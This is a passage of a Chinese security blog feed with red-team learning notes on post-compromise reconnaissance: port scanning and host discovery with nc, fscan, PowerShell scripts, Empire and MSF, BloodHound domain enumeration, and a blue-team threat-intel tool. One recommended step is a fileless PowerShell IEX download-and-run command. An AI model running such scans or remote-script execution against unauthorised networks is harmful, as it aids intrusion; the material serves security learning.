    <content type="html"><![CDATA[<blockquote><p>注：本文中的工具均来源自互联网，后门自查。</p></blockquote><p>在进入目标域后，对域内存活主机进行端口探测是经常要做的一步，在此记录一些常见的方法。</p><h2 id="1、Telnet"><a href="#1、Telnet" class="headerlink" title="1、Telnet"></a>1、Telnet</h2><p>如果想探测某台主机的某个端口是否开放，直接使用 telnet 命令是最方便的。</p><pre><code>C:\Users\daniel10&gt;telnet dc 80正在连接dc...无法打开到主机的连接。 在端口 80: 连接失败C:\Users\daniel10&gt;telnet 192.168.7.7 443正在连接192.168.7.7...无法打开到主机的连接。 在端口 443: 连接失败</code></pre><h2 id="2、nc"><a href="#2、nc" class="headerlink" title="2、nc"></a>2、nc</h2><p>素有瑞士军刀之称的 nc 也是可以拿来做端口探测的。</p><p>nc 下载地址：<a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p><pre><code>nc.exe -vv 192.168.7.7 3389</code></pre><pre><code>C:\Users\daniel10&gt;nc.exe -vv 192.168.7.7 3389DNS fwd/rev mismatch: DC != DC.teamssix.comDC [192.168.7.7] 3389 (ms-wbt-server) open</code></pre><p>拿来进行多个端口扫描也是可以的，就是扫描速度有点慢</p><pre><code>nc.exe -rz -w 2 -vv 192.168.7.7 0-65535-r 随机指定本地与远端主机的通信端口-z 使用0输入/输出模式，只在扫描通信端口时使用-w&lt;超时秒数&gt; 设置等待连线的时间</code></pre><pre><code>C:\Users\daniel10&gt;nc.exe -rz -w 2 -vv 192.168.7.7 443-445DNS fwd/rev mismatch: DC != DC.teamssix.comDC [192.168.7.7] 444 (?): TIMEDOUTDC [192.168.7.7] 443 (https): TIMEDOUTDC [192.168.7.7] 445 (microsoft-ds) opensent 0, rcvd 0</code></pre><h2 id="3、fscan"><a href="#3、fscan" class="headerlink" title="3、fscan"></a>3、fscan</h2><p>影舞者大佬写的一款工具，使用起来感觉很是方便，项目地址：<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><pre><code>fscan.exe -h 192.168.7.7 -p 22,445</code></pre><pre><code>C:\Users\daniel10&gt;fscan.exe -h 192.168.7.7 -p 22,445   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;\____/     |___/\___|_|  \__,_|\___|_|\_\                     fscan version: 1.5.1scan start(icmp) Target &#39;192.168.7.7&#39; is aliveicmp alive hosts len is: 1192.168.7.7:445 open[+] 192.168.7.7 MS17-010        (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)scan end</code></pre><h2 id="4、ScanLine"><a href="#4、ScanLine" class="headerlink" title="4、ScanLine"></a>4、ScanLine</h2><p>McAfee 出品的一款经典的端口扫描工具，ScanLine 项目地址：<a href="www.mcafee.com/us/downloads/free-tools/termsofuse.aspx">www.mcafee.com/us/downloads/free-tools/termsofuse.aspx</a></p><p>但是项目地址的下载按钮貌似失效了，其他的下载地址：<a href="https://www.lanzous.com/i32zncf">https://www.lanzous.com/i32zncf</a></p><pre><code>scanline.exe -h -t 22,80,445,3389 -p 192.168.7.7</code></pre><pre><code>C:\Users\daniel10&gt;scanline.exe -h -t 22,80,445,3389 -p 192.168.7.7ScanLine (TM) 1.01Copyright (c) Foundstone, Inc. 2002http://www.foundstone.comScan of 1 IP started at Wed Feb 24 21:31:11 2021-------------------------------------------------------------------------------192.168.7.7Responds with ICMP unreachable: NoTCP ports: 445 3389-------------------------------------------------------------------------------Scan finished at Wed Feb 24 21:31:15 20211 IP and 4 ports scanned in 0 hours 0 mins 4.03 secs</code></pre><h2 id="5、S-扫描器"><a href="#5、S-扫描器" class="headerlink" title="5、S 扫描器"></a>5、S 扫描器</h2><p>S 扫描器支持大网段扫描，扫描速度也很快，是比较早期的一款扫描工具了，比较适合运行在 Windows Server 2003 以下版本的操作系统中，下载地址：<a href="https://pan.baidu.com/s/1gdGM4F5">https://pan.baidu.com/s/1gdGM4F5</a></p><blockquote><p>值得提一句的是在我下载该工具到本地后，火绒立马给它删了，而其他的扫描工具火绒都没告警。</p></blockquote><pre><code>s.exe tcp 192.168.7.7 22,80,443,445 7</code></pre><pre><code>C:\Users\daniel10&gt;s.exe tcp 192.168.7.7 22,80,443,445 7TCP Port Scanner V1.1 By WinEggDropNormal Scan: About To Scan 4 Ports Using 7 Thread192.168.7.7      445   OpenScan 192.168.7.7 Complete In 0 Hours 0 Minutes 3 Seconds. Found 1 Open Ports</code></pre><h2 id="6、PowerShell-脚本"><a href="#6、PowerShell-脚本" class="headerlink" title="6、PowerShell 脚本"></a>6、PowerShell 脚本</h2><h3 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h3><p>PowerSploit 的 Invoke-Portscan 脚本下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1</a></p><p>无文件形式（推荐）</p><pre><code>powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#39;);Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;</code></pre><blockquote><p>如果报错，估计是网络的问题</p></blockquote><p>有文件形式</p><pre><code>powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;</code></pre><pre><code>C:\Users\daniel10&gt;powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;Hostname      : 192.168.7.7alive         : TrueopenPorts     : &#123;445, 3389&#125;closedPorts   : &#123;8080, 80, 1433&#125;filteredPorts : &#123;&#125;finishTime    : 2021/2/24 下午 21:14:06</code></pre><h3 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h3><p>nishang 的 Invoke-Portscan 脚本下载地址：<a href="https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1">https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1</a></p><pre><code> Invoke-PortScan -StartAddress 192.168.7.7 -EndAddress 192.168.7.7 -ScanPort -Port 80,443,445</code></pre><pre><code>PS C:\Users\daniel10&gt; Import-Module .\Invoke-Portscan.ps1PS C:\Users\daniel10&gt; Invoke-PortScan -StartAddress 192.168.7.7 -EndAddress 192.168.7.7 -ScanPort -Port 80,443,445IPAddress   HostName Ports---------   -------- -----192.168.7.7          &#123;445&#125;</code></pre><h2 id="7、MSF"><a href="#7、MSF" class="headerlink" title="7、MSF"></a>7、MSF</h2><p>万能的 MSF 自然也是能够进行端口探测的，MSF 中用于端口探测的模块有：</p><pre><code>auxiliary/scanner/portscan/ack          TCP ACK端口扫描auxiliary/scanner/portscan/ftpbounce    FTP bounce端口扫描auxiliary/scanner/portscan/syn             SYN端口扫描auxiliary/scanner/portscan/tcp          TCP端口扫描  auxiliary/scanner/portscan/xmas         TCP XMas端口扫描……</code></pre><p>除了上述工具外，还有 nmap、masscan 什么的就不多说了，读者如果感兴趣可以自行尝试玩玩。</p><blockquote><p>参考文章：</p><p><a href="https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/">https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;注：本文中的工具均来源自互联网，后门自查。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在进入目标域后，对域内存活主机进行端口探测是经常要做的一步，在此记录一些常见的方法。&lt;/p&gt;
&lt;h2 id=&quot;1、Telnet&quot;&gt;&lt;a href=&quot;#1、Teln</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【工具分享】写了一个威胁情报收集的小工具</title>
    <link href="https://www.teamssix.com/year/210315-133209.html"/>
    <id>https://www.teamssix.com/year/210315-133209.html</id>
    <published>2021-03-15T05:32:09.000Z</published>
    <updated>2021-03-15T05:43:04.398Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>tig <code>Threat Intelligence Gathering</code> 威胁情报收集，旨在提高蓝队拿到攻击 IP 后对其进行威胁情报信息收集的效率，目前已集成微步、IP 域名反查、Fofa 信息收集、ICP 备案查询、IP 存活检测五个模块，现已支持以下信息的查询：</p><ul><li>✅ 微步标签</li><li>✅ IP 域名反查</li><li>✅ ICP 备案查询</li><li>✅ IP 存活检测</li><li>✅ 开放端口查询</li><li>……</li></ul><p>后续将集成更多模块，如有好的建议或遇到 Bug 欢迎与我反馈，我的微信号：teamssix_com</p><p>工具地址：<a href="https://github.com/wgpsec/tig">https://github.com/wgpsec/tig</a>，或点击查看原文链接进行打开</p><p>如果感觉工具还行，欢迎各位师傅赏个 star</p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p>需要 python3 环境支持</p><pre><code>pip3 install -r requirements.txtpython3 tig.py</code></pre><h1 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h1><p>工具命令如下：</p><pre><code>-h, --help  查看帮助信息-c CONFIG   指定配置文件，默认 ./config.ini-f FILE     IP 文本，一行一个-i IP       目标 IP-p PROXY    指定代理，比如：http://127.0.0.1:1080 或者 socks5://127.0.0.1:1080</code></pre><p>在开始使用工具之前，需要对配置文件进行配置，默认配置文件如下：</p><pre><code>[Threat Intelligence]# 微步威胁情报查询，查看 api 地址：https://x.threatbook.cn/nodev4/vb4/myAPI（每天 50 次的免费额度）ThreatBook_enable = trueThreatBook_api = &#39;&#39;[IP Passive Information]# IP 反查，调用 http://api.hackertarget.com/reverseiplookup/ 的 api，每个 IP 限制每天 100 次免费查询IP_reverse_enable = true# ICP 备案信息查询，调用 https://api.vvhan.com/api/icp 的 api，如果目标 IP 没有反查到域名，该项即使开启也不会有输出ICP_beian_enable = true# Fofa ip 信息查询，查看 api 地址：https://fofa.so/user/users/detail（付费，普通会员每次100条，高级会员每次10000条）Fofa_enable = trueFofa_email = &#39;&#39;Fofa_api = &#39;&#39;[IP Active Information]# 利用 ping 命令对 IP 进行存活检测IP_survive_enable = true</code></pre><p>在配置文件里添加自己的微步 API 和 Fofa API 才可使用相关模块，添加 API 后，就可以正常使用相关模块了。</p><p>例如这里获取某个 IP 的信息，直接使用 -i 命令即可，如果想使用代理可以使用 -p 命令。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-03-15_13-03-47.png"></p><h1 id="0x03-最后"><a href="#0x03-最后" class="headerlink" title="0x03 最后"></a>0x03 最后</h1><p>如果在工具使用的过程中发现存在 bug 等问题，欢迎与我反馈，我的微信号：teamssix_com，同时也欢迎关注我的个人微信公众号：TeamsSix</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 介绍&quot;&gt;&lt;/a&gt;0x00 介绍&lt;/h1&gt;&lt;p&gt;tig &lt;code&gt;Threat Intelligence Gathering&lt;/code&gt; 威胁情</summary>
      
    
    
    
    <category term="工具分享" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
    <category term="蓝队" scheme="https://www.teamssix.com/tags/%E8%93%9D%E9%98%9F/"/>
    
    <category term="威胁情报" scheme="https://www.teamssix.com/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】5、BloodHound 的使用</title>
    <link href="https://www.teamssix.com/year/210226-190853.html"/>
    <id>https://www.teamssix.com/year/210226-190853.html</id>
    <published>2021-02-26T11:08:53.000Z</published>
    <updated>2021-02-26T10:10:32.704Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>BloodHound 使用可视化图形显示域环境中的关系，攻击者可以使用 BloodHound 识别高度复杂的攻击路径，防御者可以使用 BloodHound 来识别和防御那些相同的攻击路径。蓝队和红队都可以使用 BloodHound 轻松深入域环境中的权限关系。</p><p>BloodHound 通过在域内导出相关信息，在将数据收集后，将其导入Neo4j 数据库中，进行展示分析。因此在安装 BloodHound 时，需要安装 Neo4j 数据库。</p><h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><p>因为 Neo4j 数据库需要 Java 支持，因此安装 BloodHound 需要先安装 Java，这里以 Windows 系统下的安装为例。</p><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>JDK 需要下载最新版本，不然 Neo4j 运行可能会报错，JDK 下载地址：<a href="https://www.oracle.com/java/technologies/javase-downloads.html">https://www.oracle.com/java/technologies/javase-downloads.html</a>，下载之后，直接安装即可。</p><h3 id="Neo4j"><a href="#Neo4j" class="headerlink" title="Neo4j"></a>Neo4j</h3><p>Neo4j 直接下载最新版本，下载地址：<a href="https://neo4j.com/download-center/#community">https://neo4j.com/download-center/#community</a></p><p>下载最新版本之后解压下载文件，打开 bin 目录，执行命令<code>neo4j.bat console</code>，之后打开浏览器访问 <a href="http://localhost:7474/">http://localhost:7474</a> 登陆后台，输入以下信息连接到数据库说明安装就完成了。</p><pre><code>URL：neo4j://localhost:7687用户名(默认)：neo4j密码(默认)：neo4j</code></pre><h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>BloodHound 项目地址：<a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a>，下载后解压打开 BloodHound.exe，输入 Neo4j 数据库的账号密码即可完成安装。</p><h2 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h2><p>安装完成 BloodHound 后，需要进行数据的采集与导入，数据的采集可以使用 ps1 脚本或者使用 exe 程序收集，工具下载地址：<a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors</a></p><p>这里使用 SharpHound.exe 进行数据的采集，将 SharpHound.exe 拷贝到目标上，执行 <code>SharpHound.exe -c all</code> 进行数据采集。</p><pre><code>C:\Users\daniel10&gt;SharpHound.exe -c all---------------------------------------------Initializing SharpHound at 22:36 on 2021/2/25---------------------------------------------Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container[+] Creating Schema map for domain TEAMSSIX.COM using path CN=Schema,CN=Configuration,DC=teamssix,DC=com[+] Cache File Found! Loaded 1332 Objects in cache[+] Pre-populating Domain Controller SIDSStatus: 0 objects finished (+0) -- Using 24 MB RAMStatus: 673 objects finished (+673 134.6)/s -- Using 43 MB RAMEnumeration finished in 00:00:05.3136324Compressing data to .\20210225223622_BloodHound.zipYou can upload this file directly to the UISharpHound Enumeration Completed at 22:36 on 2021/2/25! Happy Graphing!</code></pre><p>如果使用 ps1 脚本收集，命令为：</p><pre><code>powershell -exec bypass -command &quot;Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all&quot;</code></pre><p>采集到的数据会以 zip 压缩包的格式保存，将其拷贝到 BloodHound 所在主机上，在 BloodHound 右侧图标里点击 Upload Data，之后上传刚才生成的压缩包就可以导入数据了。</p><blockquote><p>或者直接将 zip 压缩包拖拽到 BloodHound 里也可以导入数据。</p></blockquote><p>在 BloodHound 右上角有三个板块：</p><p>1、Database Info（数据库信息），可以查看当前数据库中的域用户、域计算机等统计信息。</p><p>2、Node Indo（节点信息），单击某个节点时，在这里可以看到对应节点的相关信息。</p><p>3、Analysis（分析查询），在 BloodHound 中预设了一些查询条件，具体如下：</p><pre><code>1、查询所有域管理员2、寻找到域管理员的最短路径3、查找具有DCSync权限的主体4、具有外部域组成员资格的用户5、具有外部域名组成员资格的组6、映射域信任7、到无约束委托系统的最短路径8、到达Kerberoastable用户的最短路径9、从Kerberoastable用户到域管理员的最短路径10、拥有的主体的最短路径11、从拥有的主体到域管理员的最短路径12、到高价值目标的最短路径13、查找域用户是本地管理员的计算机14、查找域用户可以读取密码的计算机15、从域用户到高价值目标的最短路径16、找到从域用户到高价值目标的所有路径17、找到域用户可以RDP的工作站18、找到域用户可以RDP的服务器19、查找域用户组的危险权限20、找到高价值群体中能够支持kerberoable的成员21、列出所有kerberoable用户22、查找具有大多数特权的Kerberoastable用户23、查找到非域控制器的域管理登录24、查找不支持操作系统的计算机25、查找AS-REP Roastable用户(DontReqPreAuth)</code></pre><p>比如这里查询到域管理员的最短路径</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-25_14-00-42.png"></p><blockquote><p>路径由粗到细表示xx对xx有权限或关系</p></blockquote><p>总的来说感觉 BloodHound 还是挺有意思的，可以很直观的看到域内主机间的关系。不过毕竟是辅助工具，还是需要不断提升自己的实力、经验才能更好的去分析这样的一个结果才是。</p><blockquote><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/7311">https://xz.aliyun.com/t/7311</a></p><p><a href="https://www.freebuf.com/sectool/179002.html">https://www.freebuf.com/sectool/179002.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;BloodHound 使用可视化图形显示域环境中的关系，攻击者可以使用 BloodHound 识别高度复杂的攻击路径，防御者</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】域内主机存活探测的一些方法总结</title>
    <link href="https://www.teamssix.com/year/210224-210909.html"/>
    <id>https://www.teamssix.com/year/210224-210909.html</id>
    <published>2021-02-24T13:09:09.000Z</published>
    <updated>2021-07-28T05:18:03.240Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>注：本文中的工具均来源自互联网，后门自查。</p></blockquote><p>在进入目标域后，对域内主机进行存活探测是不可或缺的一步，在此记录一下亿些常见的方法。</p><h2 id="1、ping"><a href="#1、ping" class="headerlink" title="1、ping"></a>1、ping</h2><p>使用 ping 进行检测的优点是不容易触发检测规则，缺点是速度较慢，如果目标开启了禁止 ping 的策略，那这个方法就 gg 了。</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><pre><code>for /l %i in (1,1,255) do @ping 192.168.7.%i -w 1 -n 1|find /i &quot;ttl=&quot;</code></pre><pre><code>C:\Users\daniel10&gt;for /l %i in (1,1,255) do @ping 192.168.7.%i -w 1 -n 1|find /i &quot;ttl=&quot;来自 192.168.7.7 的回复: 字节=32 时间&lt;1ms TTL=128来自 192.168.7.107 的回复: 字节=32 时间=1ms TTL=64来自 192.168.7.110 的回复: 字节=32 时间&lt;1ms TTL=128</code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><pre><code>for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;; done</code></pre><pre><code>teamssix@localhost:~#  for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;; done192.168.7.7192.168.7.107192.168.7.110</code></pre><h3 id="VBS"><a href="#VBS" class="headerlink" title="VBS"></a>VBS</h3><pre><code>strSubNet = &quot;192.168.7.&quot;  Set objFSO= CreateObject(&quot;Scripting.FileSystemObject&quot;)  Set objTS = objfso.CreateTextFile(&quot;C:\Result.txt&quot;)   For i = 1 To 254  strComputer = strSubNet &amp; i  blnResult = Ping(strComputer)  If blnResult = True Then  objTS.WriteLine strComputer &amp; &quot; is alived ! :) &quot;  End If  Next   objTS.Close  WScript.Echo &quot;All Ping Scan , All Done ! :) &quot;    Function Ping(strComputer)  Set objWMIService = GetObject(&quot;winmgmts:\\.\root\cimv2&quot;) Set colItems = objWMIService.ExecQuery(&quot;Select * From Win32_PingStatus Where Address=&#39;&quot; &amp; strComputer &amp; &quot;&#39;&quot;) For Each objItem In colItems  Select case objItem.StatusCode  Case 0  Ping = True  Case Else  Ping = False  End select  Exit For  Next  End Function</code></pre><h2 id="2、PowerShell"><a href="#2、PowerShell" class="headerlink" title="2、PowerShell"></a>2、PowerShell</h2><h3 id="TSPingSweep"><a href="#TSPingSweep" class="headerlink" title="TSPingSweep"></a>TSPingSweep</h3><p>PowerShell TSPingSweep 扫描脚本下载地址：</p><p><a href="https://raw.githubusercontent.com/dwj7738/My-Powershell-Repository/master/Scripts/Invoke-TSPingSweep.ps1">https://raw.githubusercontent.com/dwj7738/My-Powershell-Repository/master/Scripts/Invoke-TSPingSweep.ps1</a></p><pre><code>powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 192.168.7.1 -EndAddress 192.168.7.254 -ResolveHost -ScanPort -Port 445,135&quot;</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-23_21-02-52.png"></p><pre><code>C:\Users\daniel10&gt;powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 192.168.7.1 -EndAddress 192.168.7.254 -ResolveHost -ScanPort -Port 445,135&quot;IPAddress     HostName             Ports---------     --------             -----192.168.7.7   dc.teamssix.com      &#123;445, 135&#125;192.168.7.107 DANIEL7.teamssix.com &#123;445, 135&#125;192.168.7.110 daniel10.teamssix... &#123;445, 135&#125;</code></pre><h3 id="ARPScan"><a href="#ARPScan" class="headerlink" title="ARPScan"></a>ARPScan</h3><p>PowerShell ARPScan 扫描脚本下载地址：<a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1">https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1</a></p><pre><code>powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.7.0/24&quot;</code></pre><pre><code>C:\Users\daniel10&gt;powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.7.0/24&quot;MAC               Address---               -------16:7D:DA:D7:8F:64 192.168.7.100:0C:29:1D:82:CF 192.168.7.700:0C:29:A9:62:98 192.168.7.10700:0C:29:DC:01:0D 192.168.7.11000:0C:29:DC:01:0D 192.168.7.255</code></pre><h2 id="3、arp-scan"><a href="#3、arp-scan" class="headerlink" title="3、arp-scan"></a>3、arp-scan</h2><p>arp-scan 使用 ARP 协议进行探测。arp-scan Windows 下载地址：<a href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a></p><pre><code>C:\Users\daniel10&gt;arp-scan.exe -t 192.168.7.0/24Reply that 16:7D:DA:D7:8F:64 is 192.168.7.1 in 11.278300Reply that 00:0C:29:1D:82:CF is 192.168.7.7 in 16.140500Reply that 00:0C:29:A9:62:98 is 192.168.7.107 in 15.233500Reply that 00:0C:29:DC:01:0D is 192.168.7.110 in 0.080700Reply that 00:0C:29:DC:01:0D is 192.168.7.255 in 0.071500</code></pre><h2 id="4、arp-ping"><a href="#4、arp-ping" class="headerlink" title="4、arp-ping"></a>4、arp-ping</h2><p>Arp-ping 基于 arp 协议，它可以 “ping” 受防火墙保护的主机，下载地址：<a href="https://www.elifulkerson.com/projects/arp-ping.php">https://www.elifulkerson.com/projects/arp-ping.php</a></p><p>由于 arp-ping 只能一次 ping 一台主机，但在测试过程中肯定不能一台一台的 ping ，所以这里参考上面的 ping 脚本写了一个 arp-ping 循环 ping 主机的脚本。</p><pre><code>for /l %i in (1,1,255) do @arp-ping.exe 192.168.7.%i -w 1 -n 1|find /i &quot;Reply&quot;</code></pre><pre><code>C:\Users\daniel10&gt;for /l %i in (1,1,255) do @arp-ping.exe 192.168.7.%i -w 1 -n 1|find /i &quot;Reply&quot;Reply that 16:7D:DA:D7:8F:64 is 192.168.7.1 in 2.233msReply that 00:0C:29:A9:62:98 is 192.168.7.107 in 16.857msReply that 00:0C:29:DC:01:0D is 192.168.7.110 in 0.205msReply that 00:0C:29:DC:01:0D is 192.168.7.255 in 0.200ms</code></pre><h2 id="5、Empire"><a href="#5、Empire" class="headerlink" title="5、Empire"></a>5、Empire</h2><p>Empire 内置了arpscan 模块，该模块可利用 arp 协议对内网主机进行探测。将目标主机上线 Empire 后，使用 powershell/situational_awareness/network/arpscan 模块，设置扫描范围即可，具体如下：</p><pre><code>(Empire: listeners) &gt; agents[*] Active agents: Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen ----     -- -----------     ------------      --------                -------            ---    -----    --------- APDGSW9X ps 192.168.7.7     DC                *TEAMSSIX\administrator powershell         3648   5/0.0    2021-02-23 20:43:27(Empire: agents) &gt; usemodule powershell/situational_awareness/network/arpscan(Empire: powershell/situational_awareness/network/arpscan) &gt; set Agent APDGSW9X(Empire: powershell/situational_awareness/network/arpscan) &gt; set CIDR 192.168.7.0/24(Empire: powershell/situational_awareness/network/arpscan) &gt; executeMAC               Address      ---               -------      16:7D:DA:D7:8F:64 192.168.7.1  00:0C:29:1D:82:CF 192.168.7.7  00:0C:29:A9:62:98 192.168.7.10700:0C:29:DC:01:0D 192.168.7.11000:0C:29:1D:82:CF 192.168.7.255</code></pre><h2 id="6、nbtscan"><a href="#6、nbtscan" class="headerlink" title="6、nbtscan"></a>6、nbtscan</h2><p>nbtscan 有 Windows 和 Linux 两个版本，使用 netbios 协议扫描本地或远程 TCP/IP 网络上的开放 NetBIOS 名称服务器。</p><p>nbtscan 下载地址：<a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p><pre><code>C:\Users\daniel10&gt;nbtscan.exe 192.168.7.0/24192.168.7.1     \DP192.168.7.7     TEAMSSIX\DC                     SHARING DC192.168.7.107   TEAMSSIX\DANIEL7                SHARING*timeout (normal end of scan)</code></pre><h2 id="7、unicornscan"><a href="#7、unicornscan" class="headerlink" title="7、unicornscan"></a>7、unicornscan</h2><p>unicornscan 使用 UDP 协议，在 kali 下可以直接 apt-get 进行安装，这个使用起来感觉有点慢。</p><pre><code>teamssix@localhost:~# unicornscan -mU 192.168.7.7UDP open              domain[   53]        from 192.168.7.7  ttl 127teamssix@localhost:~# for k in $( seq 1 255);do unicornscan -mU 192.168.7.$k|grep &quot;open&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $5&#125;&#39;; done192.168.7.1192.168.7.7192.168.7.107</code></pre><h2 id="8、scanline"><a href="#8、scanline" class="headerlink" title="8、scanline"></a>8、scanline</h2><p>McAfee 出品，推荐 win 下使用（管理员执行），scanline 项目地址：<a href="www.mcafee.com/us/downloads/free-tools/termsofuse.aspx">www.mcafee.com/us/downloads/free-tools/termsofuse.aspx</a></p><p>但是项目地址的下载按钮貌似失效，其他的下载地址：<a href="https://www.lanzous.com/i32zncf">https://www.lanzous.com/i32zncf</a></p><pre><code>C:\Users\daniel10&gt;scanline.exe -n 192.168.7.0-255ScanLine (TM) 1.01Copyright (c) Foundstone, Inc. 2002http://www.foundstone.comScan of 256 IPs started at Tue Feb 23 22:07:40 2021-------------------------------------------------------------------------------192.168.7.7Responded in 0 ms.0 hops awayResponds with 